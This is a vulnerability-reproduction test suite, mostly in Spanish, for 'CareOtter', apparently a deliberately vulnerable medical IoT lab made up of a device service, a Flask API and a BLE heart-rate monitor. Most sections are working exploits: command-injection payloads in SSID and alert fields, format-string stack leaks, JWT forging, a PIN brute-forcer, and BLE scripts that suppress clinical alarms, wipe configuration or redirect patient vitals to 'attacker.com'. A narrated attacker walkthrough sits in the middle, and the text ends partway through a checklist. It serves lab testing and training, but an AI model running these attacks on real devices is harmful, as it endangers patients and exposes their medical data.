# CareOtter — Test Suite de Reproducción de Vulnerabilidades

> **Versión:** 1.0  
> **Fecha:** 2026-03-23  
> **Scope:** `labs/careotter/`, `cloud_api/careotter/`, `vulnzoo_apps/careotter_app/`  
> **Objetivo:** Verificar que todas las vulnerabilidades documentadas en `docs/CareOtter/` son reproducibles en el entorno de laboratorio.

---

## Tabla de contenidos

1. [Precondiciones Generales](#precondiciones-generales)
2. [Helpers Comunes](#helpers-comunes)
3. [Sección A — CareService (IGP v4)](#sección-a--careservice-igp-v4)
   - [IGP-01: Hardcoded Credential](#igp-01--hardcoded-credential-ottermobile2026)
   - [IGP-02: WiFi PSK Disclosure](#igp-02--information-disclosure-wifi-psk)
   - [IGP-03: TLV Integer Underflow → Stack BOF](#igp-03--integer-underflow--stack-bof)
   - [IGP-04: Format String (VERIFY_STATUS)](#igp-04--format-string-verify_status)
   - [IGP-05: Shell Injection (SET_WIFI)](#igp-05--shell-injection-set_wifi)
   - [IGP-06: Global Auth State Persistence](#igp-06--global-authentication-state-persistence)
   - [IGP-07: Format String in Therapy Log](#igp-07--format-string-in-therapy-log-defibrillate)
   - [IGP-08: Command Injection (EMERGENCY_ALERT)](#igp-08--command-injection-emergency_alert)
4. [Sección B — Cloud API (Flask)](#sección-b--cloud-api-flask)
   - [API-01: Weak JWT Secret](#api-01--weak-jwt-secret)
   - [API-02: WiFi PSK via REST](#api-02--wifi-psk-disclosure-via-rest)
   - [API-03: Format String Proxy](#api-03--format-string-proxy)
   - [API-04: Flask Debug Mode / RCE](#api-04--flask-debug-mode--werkzeug-rce)
   - [API-05: Weak Password Storage](#api-05--weak-password-storage-sha-256-no-salt)
   - [API-06: Partial Role Checks](#api-06--partial-role-checks)
5. [Sección C — BLE / Mobile App](#sección-c--ble--mobile-app)
   - [BLE-01: Missing BLE Pairing](#ble-01--missing-ble-pairing--bonding)
   - [BLE-02: Unencrypted BLE Channel](#ble-02--unencrypted-ble-channel)
   - [BLE-03: Plaintext External Storage Logging](#ble-03--plaintext-external-storage-logging)
   - [BLE-04: Hidden Diagnostic Panel](#ble-04--hidden-diagnostic-panel)
   - [BLE-05: Unvalidated GATT Writes](#ble-05--unvalidated-gatt-writes)
   - [BLE-06: CSCP v1 Hardcoded Key (M1)](#ble-06--cscp-v1-hardcoded-key-extraction-m1)
   - [BLE-07: CSCP v1 Threshold Forging (M3)](#ble-07--cscp-v1-threshold-forging-m3)
   - [BLE-08: Hidden Provisioning Service (P1)](#ble-08--hidden-provisioning-service-discovery-p1)
   - [BLE-09: Factory PIN Brute Force (P3)](#ble-09--factory-pin-brute-force-p3)
   - [BLE-10: WiFi PSK Extraction (P5)](#ble-10--wifi-psk-extraction-p5)
   - [BLE-11: Shell Injection via Provisioning (P4)](#ble-11--shell-injection-via-provisioning-p4)
   - [BLE-12: SSRF via Cloud URL (P6)](#ble-12--ssrf-via-cloud-url-redirection-p6)
   - [BLE-13: Unauthenticated Factory Reset (P7)](#ble-13--unauthenticated-factory-reset-p7)
   - [BLE-14: Channel Never Expires (P8)](#ble-14--provisioning-channel-never-expires-p8)
6. [Checklist de Validación Rápida](#checklist-de-validación-rápida)
7. [Anexos](#anexos)
   - [A. Script IGP Helper](#a-script-igp-helper)
   - [B. Script CSCP Forger](#b-script-cscp-threshold-forger)

---

## Precondiciones Generales

| Recurso | Dirección / Estado |
|---------|-------------------|
| Raspberry Pi (OpenWRT) | `192.168.2.1` |
| CareService (IGP v4) | `192.168.2.1:9999` |
| Medical Sensor HTTP | `192.168.2.1:8081` |
| Cloud API (Flask) | `<operator-pc>:5002` (Docker) |
| Modo vulnerable | `VULNERABLE=1` (por defecto) |
| BLE Peripheral | `CareOtter_HR` (advertising) |

**Herramientas necesarias:** `curl`, `python3`, `netcat`/`nc`, `strings`, `jadx` (opcional), adaptador BLE + `bleak`/`pycryptodome` (para tests BLE).

---

## Helpers Comunes

### A. IGP Helper (Python)

Guardar como `igp_helper.py`:

```python
import socket
import struct
import sys

MAGIC = 0x43415245


def igp(cmd: int, payload: bytes = b'') -> bytes:
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)


if __name__ == '__main__':
    cmd = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x01
    payload = sys.argv[2].encode() if len(sys.argv) > 2 else b''
    print(igp(cmd, payload).decode('utf-8', errors='replace'))
```

Uso:
```bash
python3 igp_helper.py 0x02 "OtterMobile2026"
```

### B. Obtener JWT válido (API)

```bash
# Admin
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Patient
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"patient","password":"patient123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

---

## Sección A — CareService (IGP v4)

### IGP-01 — Hardcoded Credential (`OtterMobile2026`)

**Documentación:** `CareOtter.md` Vuln #1  
**OWASP:** IoT I1 — Weak, Guessable, or Hardcoded Passwords
**Tipo:** CWE-798 (Hardcoded Credentials)  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# Método A: extracción estática del binario
strings /opt/careotter/careservice | grep -i otter

# Método B: prueba directa por IGP
python3 igp_helper.py 0x02 "OtterMobile2026"

# Método C: token incorrecto (control negativo)
python3 igp_helper.py 0x02 "WrongToken123"
```

#### Resultado esperado

- `strings` muestra `OtterMobile2026` en texto plano.
- Token correcto → `AUTH_SUCCESS`.
- Token incorrecto → `AUTH_FAIL`.

---

### IGP-02 — Information Disclosure (WiFi PSK)

**Documentación:** `CareOtter.md` Vuln #2  
**OWASP:** IoT I6 — Insufficient Privacy Protection
**Tipo:** CWE-200 (Information Exposure)  
**Severidad:** High

#### Pasos de reproducción

```bash
# 1. Autenticar
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Solicitar configuración de red (requiere auth previo)
python3 igp_helper.py 0x03
```

#### Resultado esperado

La respuesta contiene el contenido completo de `/etc/config/wireless`, incluyendo `option key 'MiClaveWiFi'` en texto plano.

---

### IGP-03 — Integer Underflow → Stack BOF (TLV Parser)

**Documentación:** `CareOtter.md` Vuln #3  
**OWASP:** IoT I9 — Insecure Default Settings
**Tipo:** CWE-191 → CWE-121  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# Autenticar primero
python3 igp_helper.py 0x02 "OtterMobile2026"

# Enviar TLV malicioso: Type=0xAA, Len=0xFF, solo 2 bytes reales
python3 -c "
import socket, struct
MAGIC = 0x43415245
payload = b'\xAA\xFF\x41\x41'
hdr = struct.pack('>IBBH', MAGIC, 0x04, 0, len(payload))
with socket.create_connection(('192.168.2.1', 9999)) as s:
    s.sendall(hdr + payload)
    print(s.recv(4096))
"
```

#### Resultado esperado

El servicio puede crasharse (segfault) o presentar comportamiento anómalo debido a que `remaining` underflowea y `memcpy` escribe fuera de `local_store[128]`.

---

### IGP-04 — Format String (VERIFY_STATUS)

**Documentación:** `CareOtter.md` Vuln #4  
**OWASP:** IoT I9 — Insecure Default Settings
**Tipo:** CWE-134  
**Severidad:** High

#### Pasos de reproducción

```bash
# No requiere autenticación
python3 igp_helper.py 0x05 '%x.%x.%x'
```

#### Resultado esperado

La respuesta contiene valores hexadecimales de la pila del proceso (ej. `bffff3a0.8048c23.1`). Con `%n` se puede demostrar escritura en memoria.

---

### IGP-05 — Shell Injection (SET_WIFI)

**Documentación:** `CareOtter.md` Vuln #5  
**OWASP:** IoT I9 — Insecure Default Settings
**Tipo:** CWE-78 (OS Command Injection)  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# 1. Autenticar
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Inyectar comando a través del SSID
python3 igp_helper.py 0x06 "'; touch /tmp/igp_wifi_pwned #|fakepass123"
```

#### Resultado esperado

Se crea el archivo `/tmp/igp_wifi_pwned` en el Raspberry Pi, demostrando interpolación directa en `system()` sin sanitización.

---

### IGP-06 — Global Authentication State Persistence

**Documentación:** `CareOtter.md` Vuln #6  
**OWASP:** IoT I7 — Insecure Data Transfer and Storage
**Tipo:** CWE-613 (Insufficient Session Expiration)  
**Severidad:** High

#### Pasos de reproducción

```bash
# Conexión A: autenticar
python3 igp_helper.py 0x02 "OtterMobile2026"

# Conexión B: SIN autenticar, solicitar comando protegido directamente
python3 igp_helper.py 0x03
```

#### Resultado esperado

La segunda conexión (TCP completamente nueva) recibe la configuración WiFi sin haber enviado nunca el token, demostrando que `authenticated` es una variable global persistente en el proceso `careservice`.

---

### IGP-07 — Format String in Therapy Log (DEFIBRILLATE)

**Documentación:** `CareOtter.md` Vuln #11  
**OWASP:** IoT I9 — Insecure Default Settings
**Tipo:** CWE-134  
**Severidad:** High

#### Pasos de reproducción

```bash
# 1. Autenticar
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Disparar DEFIBRILLATE con format string
python3 igp_helper.py 0x0B '%x.%x.%x'
```

#### Resultado esperado

La respuesta muestra `DEFIBRILLATED:200J:<timestamp>`, pero además `/tmp/careotter_events.log` contiene valores de la pila filtrados por el segundo `snprintf` vulnerable que usa el payload como formato.

---

### IGP-08 — Command Injection (EMERGENCY_ALERT)

**Documentación:** `CareOtter.md` Vuln #12  
**OWASP:** IoT I9 — Insecure Default Settings
**Tipo:** CWE-78  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# 1. Autenticar
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Inyectar comando a través del parámetro msg de curl
python3 igp_helper.py 0x0C "test'; touch /tmp/alert_pwned #"
```

#### Resultado esperado

Se crea el archivo `/tmp/alert_pwned` en el dispositivo, demostrando que el payload se concatenó sin escaping en el comando `curl -d 'msg=...'` ejecutado vía `system()`.

---

## Sección B — Cloud API (Flask)

### API-01 — Weak JWT Secret

**Documentación:** `CareOtter.md` Vuln #7 / `CareOtter_API.md` Critical #1  
**OWASP:** API2 — Broken Authentication
**Tipo:** CWE-798  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# Extraer el secreto del código fuente
grep -r "JWT_SECRET" cloud_api/careotter/api_server/config.py

# Generar token JWT válido con secreto conocido
python3 -c "
import jwt, time
token = jwt.encode(
    {'username': 'admin', 'role': 'admin', 'exp': time.time() + 3600},
    'careotter_jwt_2026',
    algorithm='HS256'
)
print(token)
"

# Usar token forjado contra endpoint protegido
curl -H "Authorization: Bearer <TOKEN_FORJADO>" \
     http://localhost:5002/api/network
```

#### Resultado esperado

La API acepta el token forjado y devuelve la configuración de red.

---

### API-02 — WiFi PSK Disclosure via REST

**Documentación:** `CareOtter.md` Vuln #8  
**OWASP:** API1 — Broken Object Level Authorization
**Tipo:** CWE-200  
**Severidad:** High

#### Pasos de reproducción

```bash
# 1. Obtener JWT válido
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Solicitar red (solo en VULNERABLE=1)
curl -s -H "Authorization: Bearer $JWT" \
     http://localhost:5002/api/network | python3 -m json.tool
```

#### Resultado esperado

El campo `raw` contiene el PSK WiFi en texto plano. En `VULNERABLE=0` este campo está omitido (prueba de control).

---

### API-03 — Format String Proxy

**Documentación:** `CareOtter.md` Vuln #9  
**OWASP:** API10 — Unsafe Consumption of APIs
**Tipo:** CWE-134  
**Severidad:** High

#### Pasos de reproducción

```bash
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login \
  -d '{"username":"admin","password":"CareOtter2026!"}' \
  -H "Content-Type: application/json" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -H "Authorization: Bearer $JWT" \
     "http://localhost:5002/api/device/status?module=%25x.%25x.%25x"
```

#### Resultado esperado

En modo `VULNERABLE=1`, la respuesta contiene valores de la pila del proceso `careservice`. En `VULNERABLE=0` el módulo se fuerza a `CareOtter`.

---

### API-04 — Flask Debug Mode / Werkzeug RCE

**Documentación:** `CareOtter.md` Vuln #10  
**OWASP:** API8 — Security Misconfiguration
**Tipo:** CWE-489  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# Verificar que debug está activo
curl -s http://localhost:5002/api/nonexistent | grep -i "debugger\|traceback"

# Intentar acceder a la consola interactiva
curl -s http://localhost:5002/console | head
```

#### Resultado esperado

Se observa el traceback HTML de Werkzeug con el botón de consola interactiva. Si se obtiene el PIN (vía lectura de logs o ataque al RNG de Werkzeug), se consigue RCE.

---

### API-05 — Weak Password Storage (SHA-256, no salt)

**Documentación:** `CareOtter_API.md` Vulnerability Surface #4  
**OWASP:** API2 — Broken Authentication
**Tipo:** CWE-916  
**Severidad:** Medium

#### Pasos de reproducción

```bash
# Calcular hash SHA-256 de la contraseña por defecto
echo -n 'CareOtter2026!' | sha256sum

# Comparar con el almacenado en SQLite
sqlite3 /app/data/careotter.db \
  "SELECT username, password_hash FROM users WHERE username='admin';"
```

#### Resultado esperado

El `password_hash` almacenado es idéntico al output de `sha256sum`, sin salt ni iteraciones.

---

### API-06 — Partial Role Checks

**Documentación:** `CareOtter_API.md` Vulnerability Surface #8  
**OWASP:** API5 — Broken Function Level Authorization
**Tipo:** CWE-863  
**Severidad:** Medium

#### Pasos de reproducción

```bash
# 1. Login como PACIENTE
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -d '{"username":"patient","password":"patient123"}' \
  -H "Content-Type: application/json" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Intentar acceder a endpoint "admin-only" vía API REST
curl -s -H "Authorization: Bearer $JWT_PATIENT" \
     http://localhost:5002/api/network
```

#### Resultado esperado

El endpoint `/api/network` devuelve datos en lugar de rechazar al paciente (`403`), demostrando que `@token_required` verifica firma/expiración pero **no el claim `role`**.

---

## Sección C — BLE / Mobile App

### BLE-01 — Missing BLE Pairing / Bonding

**Documentación:** `CareOtter_App.md` VULN #1 / M4  
**OWASP:** Mobile M3 — Insecure Authentication/Authorization
**Tipo:** CWE-306  
**Severidad:** High

#### Pasos de reproducción

```bash
# Usar un adaptador BLE secundario para anunciar
sudo hciconfig hci0 name "CareOtter_HR"
sudo hciconfig hci0 leadv 0
```

#### Resultado esperado

La app Android `careotter_app` se conecta automáticamente al dispositivo falso sin solicitar pairing, sin verificar MAC address y sin comprobar service UUIDs.

---

### BLE-02 — Unencrypted BLE Channel

**Documentación:** `CareOtter_App.md` VULN #5  
**OWASP:** Mobile M5 — Insecure Communication
**Tipo:** CWE-319  
**Severidad:** Medium

#### Pasos de reproducción

```bash
# En Android rooted: activar HCI snoop
adb shell settings put global bluetooth_hci_snoop_log 1

# Ejecutar la app y conectar al dispositivo
adb pull /data/misc/bluetooth/logs/btsnoop_hci.log

# Analizar con Wireshark (filtro: btle.gatt)
```

#### Resultado esperado

Wireshark muestra las notificaciones GATT de Heart Rate y SpO₂ en texto plano, sin cifrado LE Secure Connections.

---

### BLE-03 — Plaintext External Storage Logging

**Documentación:** `CareOtter_App.md` VULN #3  
**OWASP:** Mobile M9 — Insecure Data Storage
**Tipo:** CWE-312  
**Severidad:** Medium

#### Pasos de reproducción

```bash
# Extraer log de vitales del almacenamiento externo
adb shell cat /sdcard/careotter_vitals.log
```

#### Resultado esperado

El archivo contiene lecturas históricas de BPM y SpO₂ con timestamps en texto plano, legible por cualquier app con permiso `READ_EXTERNAL_STORAGE`.

---

### BLE-04 — Hidden Diagnostic Panel

**Documentación:** `CareOtter_App.md` VULN #6  
**OWASP:** Mobile M8 — Security Misconfiguration
**Tipo:** CWE-912  
**Severidad:** Low

#### Pasos de reproducción

```bash
# Método A: Decompilación estática
jadx careotter_app.apk -d output/
grep -r "DIAG_TAP_TARGET\|diagTapCount" output/

# Método B: Dinámico
# En la app, tocar 5 veces rápidamente (dentro de 3 segundos) sobre el título
# "CareOtter Monitor". Aparecerá el panel de thresholds.
```

#### Resultado esperado

Aparece el panel `DIAG` con campo JSON editable y botones Read/Write Threshold, que normalmente está oculto (`android:visibility="gone"`).

---

### BLE-05 — Unvalidated GATT Writes

**Documentación:** `CareOtter_App.md` VULN #2  
**OWASP:** Mobile M4 — Insufficient Input/Output Validation
**Tipo:** CWE-20  
**Severidad:** High

#### Pasos de reproducción

```bash
# Desde nRF Connect o script bleak:
# UUID: 0000ff01-0000-1000-8000-00805f9b34fb
# Valor (UTF-8): {"bpm_min":0,"bpm_max":300,"spo2_min":0}
```

#### Resultado esperado

El dispositivo acepta el JSON sin validar rangos clínicos. La app refleja los valores y las alertas quedan suprimidas.

---

### BLE-06 — CSCP v1 Hardcoded Key Extraction (M1)

**Documentación:** `CareOtter_App.md` M1  
**OWASP:** Mobile M1 — Improper Credential Usage
**Tipo:** CWE-798  
**Severidad:** Critical

#### Pasos de reproducción

```bash
# Extraer clave del APK
strings careotter_app.apk | grep "careotter-key-16"

# Del firmware del dispositivo
strings /opt/medical-sensor/ble_server.py | grep "key-"
```

#### Resultado esperado

La clave AES-128-ECB `careotter-key-16` se encuentra en texto plano tanto en el APK como en el firmware del servidor BLE.

---

### BLE-07 — CSCP v1 Threshold Forging (M3)

**Documentación:** `CareOtter_App.md` M3  
**OWASP:** Mobile M3 — Insecure Authentication/Authorization
**Tipo:** CWE-306 + CWE-20  
**Severidad:** Critical

#### Pasos de reproducción

Usar el script del **Anexo B** (`forge_threshold.py`):

```bash
pip install bleak pycryptodome
python3 forge_threshold.py
```

#### Resultado esperado

El paquete de 24 bytes es aceptado inmediatamente por `ble_server.py`. Los umbrales letales (`bpm_min=0`, `bpm_max=255`, `spo2_min=0`) se aplican sin validación de rango clínico.

---

---

### BLE-08 — Hidden Provisioning Service Discovery (P1)

> TESTED

**Documentation:** `CareOtter.md` P1  
**OWASP:** IoT I3 — Insecure Ecosystem Interfaces / Mobile M8
**Type:** CWE-200 (Information Disclosure) + CWE-912 (Hidden Functionality)
**Severity:** High

#### Steps to Reproduce

```python
from bleak import BleakClient, BleakScanner

async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR")
    async with BleakClient(device) as c:
        services = await c.get_services()
        for s in services.services.values():
            if "ff10" in s.uuid:
                print("[+] Hidden provisioning service found:", s.uuid)
                for ch in s.characteristics:
                    print("    -", ch.uuid, ch.properties)

import asyncio
asyncio.run(main())
```

#### Expected Result
`0xFF10` is listed among the discovered services, even though **it is not advertised**. Its characteristics `0xFF11` (read/write/notify) and `0xFF12` (read/write) are visible.

1. Reconocimiento pasivo BLE (Advertising Scan)
El atacante comienza escaneando el espectro 2.4 GHz en busca de periféricos BLE cercanos. Con cualquier herramienta estándar vería:

Herramienta	Comando / Acción
nRF Connect (Android/iOS)	Scan → filtrar por nombre CareOtter_HR
bluetoothctl (Linux)	scan on → info <MAC>
hcitool	hcitool lescan
Bleak (Python)	BleakScanner.discover()
Lo que vería en el anuncio (advertisement):

Nombre: CareOtter_HR
UUIDs anunciados: 0x180D (Heart Rate), 0x1822 (SpO2), 0x180F (Battery), 0x180A (Device Info), 0xFF00 / 0xFF01 (Alert/Config)
Observación clave: El anuncio NO lista 0xFF10. Un auditor atento anotaría esto: "El dispositivo declara 6 servicios públicos, pero los campos de advertising no están saturados; hay espacio para más. ¿Qué hay tras la conexión?"

2. Conexión y enumeración completa GATT
Aquí es donde ocurre el descubrimiento. El hacker se conecta y enumera TODOS los servicios, no solo los anunciados:

Con bluetoothctl / gatttool
bluetoothctl
connect XX:XX:XX:XX:XX:XX
menu gatt
list-attributes
Con gatttool (más explícito)
gatttool -b XX:XX:XX:XX:XX:XX -I
[XX:XX:XX:XX:XX:XX][LE]> connect
[XX:XX:XX:XX:XX:XX][LE]> primary
Con Python + Bleak (sin el script del anexo, escribiendo su propio reconocimiento)
import asyncio
from bleak import BleakClient, BleakScanner

async def recon():
    dev = await BleakScanner.find_device_by_name("CareOtter_HR")
    async with BleakClient(dev) as client:
        services = await client.get_services()
        for svc in services:
            print(f"[+] Service: {svc.uuid}")
            for ch in svc.characteristics:
                print(f"    Char: {ch.uuid} | Props: {ch.properties}")

asyncio.run(recon())
Resultado inesperado: Aparece un séptimo servicio:

[+] Service: 0000ff10-0000-1000-8000-00805f9b34fb
    Char: 0000ff11-0000-1000-8000-00805f9b34fb | Props: ['read', 'write', 'notify']
    Char: 0000ff12-0000-1000-8000-00805f9b34fb | Props: ['read', 'write']
3. Análisis del servicio oculto (interacción manual)
El hacker ahora sabe que hay un servicio que el fabricante no declara públicamente. El siguiente paso es determinar qué hace, interactivamente:

3.1 Leer las características sin autenticación
# Con gatttool
char-read-uuid 0xFF11
char-read-uuid 0xFF12
3.2 Observar respuestas
0xFF11 (read): Devuelve un JSON con campos como wifi_ssid, wifi_psk, cloud_url → Fuga de credenciales WiFi (esto conecta con BLE-10/P5).
0xFF12 (read): Devuelve un contador de intentos o un estado de autenticación.
3.3 Probar escrituras no autenticadas
Escribir en 0xFF11 un JSON de prueba:

{"cmd":"wifi_get"}
Si responde con datos sensibles, el hacker confirma que el canal está funcional y sin protección por defecto.

4. Validación de la hipótesis de "hidden functionality"
Para reportar esto como vulnerabilidad y no como "feature no documentada", el hacker necesita evidencia de que el fabricante intencionalmente lo ocultó:

Prueba	Evidencia
Advertising packets	Comparar advertisement_data.service_uuids vs get_services(). Si 0xFF10 está en GATT pero no en AD, es deliberado.
Documentación del fabricante	Buscar en manuales clínicos, datasheets o apps oficiales. Si no mencionan "Factory Provisioning" o "Técnico", es funcionalidad oculta.
Espacio de UUID	0xFF10-0xFF12 cae en el rango de "vendor specific" (no estandarizado por Bluetooth SIG), típico de funciones de fábrica.
Comportamiento de la app oficial	Si la app Flutter de CareOtter no lista 0xFF10 en su UI ni en su código fuente descompilado (JADX), confirma que es un canal no expuesto al usuario final.
5. Escalabilidad: descubrir el resto de la cadena
Una vez encontrado 0xFF10, el hacker ya tiene el entry point para encadenar todo lo demás sin necesidad de tener los scripts de los anexos:

Descubrimiento	Método manual	Resultado
P3 — PIN brute force	Escribir 0000..9999 en 0xFF12, medir latencia de respuesta	PIN 1234 aceptado en <100 ms
P4 — Shell injection	Escribir {"cmd":"wifi_set","ssid":"'; touch /tmp/pwned; #"} en 0xFF11	Ejecución remota de comandos
P6 — SSRF	{"cmd":"cloud_set","url":"http://attacker.com"}	El dispositivo envía vitales al atacante
P7 — Factory reset	{"cmd":"factory_reset"}	Borrado sin confirmación ni auth adicional
P8 — No expira	Dejar el dispositivo 30 min, repetir pasos anteriores	Canal sigue activo
6. Redacción del reporte (ejemplo de estructura)
El hacker documentaría así:

VULNERABILIDAD: Hidden Factory Provisioning Service (P1)

CWE-200 (Information Exposure) + CWE-912 (Hidden Functionality)

Descripción:
El dispositivo CareOtter_HR expone un servicio GATT no anunciado (0xFF10) que contiene dos características (0xFF11, 0xFF12). Este canal permite la configuración de red WiFi, la redirección del backend cloud y el factory reset del dispositivo. Dado que no aparece en los paquetes de advertising ni en la documentación clínica del producto, constituye una funcionalidad oculta de fábrica accesible a cualquier atacante con acceso BLE.

Pasos para reproducir:

Escanear periféricos BLE y localizar CareOtter_HR.
Conectar mediante BleakClient o gatttool.
Ejecutar get_services() / primary.
Observar que 0xFF10 está presente a pesar de no estar en advertisement.service_uuids.
Impacto:
High — Permite a un atacante no autenticado (tras trivial brute-force del PIN de 4 dígitos) reconfigurar el dispositivo, extraer credenciales WiFi, redirigir datos médicos a servidores arbitrarios o borrar la configuración del paciente.

Recomendación:

Eliminar el servicio 0xFF10 en builds de producción, O
Añadir autenticación robusta (no PIN de 4 dígitos) y rate-limiting, O
Implementar el mecanismo de expiración de 30 minutos que la documentación promete pero el firmware no ejecuta.
Resumen del mindset del atacante
Fase	Mentalidad	Herramienta típica
Scan	"¿Qué anuncia vs. qué realmente tiene?"	nRF Connect, bluetoothctl
Enumerate	"Conectar y listar TODO el árbol GATT"	gatttool, Bleak
Diff	"¿Hay UUIDs en GATT que no estén en el advertisement?"	Script propio de 10 líneas
Interact	"¿Qué devuelve si leo/escribo sin saber el protocolo?"	Prueba y error con JSON
Chain	"Este hidden service es la puerta de entrada para todo lo demás"	Exploit manual incremental
La clave está en la diferencia entre advertisement_data y get_services(): muchos desarrolladores asumen que "si no lo anuncio, nadie lo encontrará", pero BLE exige la enumeración GATT tras la conexión; cualquier cliente BLE la realiza automáticamente. El hacker no necesita el script del anexo: solo necesita conectar y listar atributos — algo que hace cualquier app BLE del mercado.

---

### BLE-09 — Factory PIN Brute Force (P3)

**Documentación:** `CareOtter.md` P3  
**OWASP:** IoT I5 — Insecure Ecosystem Interfaces / Mobile M1
**Tipo:** CWE-307 + CWE-798  
**Severidad:** High

#### Pasos de reproducción

```python
from bleak import BleakClient, BleakScanner

async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR")
    async with BleakClient(device) as c:
        for pin in range(0, 10000):
            pin_str = f"{pin:04d}"
            await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", pin_str.encode())
            data = await c.read_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb")
            remaining = int(json.loads(data.decode())["attempts_remaining"])
            if remaining == 3:  # reset after success
                print(f"[+] PIN found: {pin_str}")
                break

import asyncio, json
asyncio.run(main())
```

#### Resultado esperado
El PIN `1234` es aceptado. No hay bloqueo tras miles de intentos fallidos.

---

### BLE-10 — WiFi PSK Extraction (P5)

**Documentación:** `CareOtter.md` P5  
**OWASP:** IoT I6 — Insufficient Privacy Protection
**Tipo:** CWE-312  
**Severidad:** High

#### Pasos de reproducción

```python
import json
from bleak import BleakClient

async def extract_wifi(mac):
    async with BleakClient(mac) as c:
        await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", b"1234")
        data = await c.read_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb")
        cfg = json.loads(data.decode())
        print(f"SSID: {cfg['wifi_ssid']}, PSK: {cfg['wifi_psk']}")
```

#### Resultado esperado
La contraseña WiFi actual se devuelve en el campo `wifi_psk` en texto plano.

---

### BLE-11 — Shell Injection via Provisioning (P4)

**Documentación:** `CareOtter.md` P4  
**OWASP:** IoT I9 — Insecure Default Settings / Mobile M7
**Tipo:** CWE-78  
**Severidad:** Critical

#### Pasos de reproducción

```python
import json
from bleak import BleakClient

PAYLOAD = json.dumps({"cmd":"wifi_set","ssid":"'; touch /tmp/ble_pwned; #'","psk":"x"})

async def exploit(mac):
    async with BleakClient(mac) as c:
        await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", b"1234")
        await c.write_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb", PAYLOAD.encode())
        print("[+] Shell injection delivered")
```

#### Resultado esperado
El comando `touch /tmp/ble_pwned` se ejecuta en el monitor. Verificar en la Raspberry Pi:
```bash
ls /tmp/ble_pwned
```

---

### BLE-12 — SSRF via Cloud URL Redirection (P6)

**Documentación:** `CareOtter.md` P6  
**OWASP:** API7 — Server Side Request Forgery / IoT I3
**Tipo:** CWE-918  
**Severidad:** High

#### Pasos de reproducción

```python
import json
from bleak import BleakClient

PAYLOAD = json.dumps({"cmd":"cloud_set","url":"http://attacker.com:5002"})

async def exploit(mac):
    async with BleakClient(mac) as c:
        await c.write_gatt_char("0000ff12-0000-1000-8000-00805f9b34fb", b"1234")
        await c.write_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb", PAYLOAD.encode())
```

#### Resultado esperado
El monitor redirige todas las llamadas posteriores de la Cloud API al servidor del atacante. Verificar leyendo `0xFF11` (`cloud_get` / `ReadValue`) — el campo `cloud_url` refleja la URL maliciosa.

---

### BLE-13 — Unauthenticated Factory Reset (P7)

**Documentación:** `CareOtter.md` P7  
**OWASP:** IoT I2 — Insecure Network Services / Mobile M3
**Tipo:** CWE-306 + CWE-940  
**Severidad:** Critical

#### Pasos de reproducción

```python
import json
from bleak import BleakClient

PAYLOAD = json.dumps({"cmd":"factory_reset"})

async def exploit(mac):
    async with BleakClient(mac) as c:
        # Note: even without PIN auth, the command is accepted
        await c.write_gatt_char("0000ff11-0000-1000-8000-00805f9b34fb", PAYLOAD.encode())
```

#### Resultado esperado
La configuración de fábrica se restaura inmediatamente. WiFi se desconfigura (`/etc/config/wireless` vuelve a valores por defecto). El monitor pierde conectividad hasta nuevo provisioning.

---

### BLE-14 — Provisioning Channel Never Expires (P8)

**Documentación:** `CareOtter.md` P8  
**OWASP:** IoT I7 — Insecure Data Transfer and Storage / Mobile M3
**Tipo:** CWE-912  
**Severidad:** Medium

#### Pasos de reproducción

1. Dejar el monitor encendido durante >30 minutos.
2. Ejecutar cualquiera de los exploits BLE-08 a BLE-13.

#### Resultado esperado
El canal de provisioning sigue respondiendo normalmente. La documentación del fabricante indica que debería estar cerrado tras 30 minutos, pero el firmware nunca realiza la comprobación.

---

## Checklist de Validación Rápida

| ID | Vulnerabilidad | Comando / Script | Resultado Esperado |
|----|---------------|------------------|-------------------|
| IGP-01 | Hardcoded token | `strings careservice \| grep Otter` | `OtterMobile2026` en plaintext |
| IGP-02 | WiFi PSK leak | `python3 igp_helper.py 0x03` | `option key '...'` visible |
| IGP-03 | TLV underflow | `igp 0x04` con `\xAA\xFF\x41\x41` | Crash o comportamiento anómalo |
| IGP-04 | Format string | `igp 0x05 '%x.%x.%x'` | Stack leak en respuesta |
| IGP-05 | Shell injection | `igp 0x06 "'; touch /tmp/pwned #\|x"` | Archivo creado en RPi |
| IGP-06 | Global auth | `igp 0x03` sin auth previo en nueva TCP | Devuelve datos (RESTRICTED esperado) |
| IGP-07 | Therapy format string | `igp 0x0B '%x.%x.%x'` | Stack leak en `careotter_events.log` |
